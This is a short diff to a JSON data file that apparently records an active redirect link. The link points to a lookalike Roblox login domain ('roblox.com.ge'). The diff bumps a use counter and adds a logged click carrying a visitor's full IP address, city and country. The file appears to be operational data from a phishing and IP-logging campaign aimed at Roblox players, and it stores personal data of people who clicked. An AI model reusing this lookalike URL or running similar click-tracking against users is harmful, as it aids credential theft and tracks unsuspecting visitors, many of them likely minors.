@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1337,
+    "useCount": 1338,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10864,6 +10864,14 @@
         "city": "Worcester Park",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777410875835,
+        "ip": "186.194.45.241",
+        "country": "Brazil",
+        "city": "Casimiro de Abreu",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
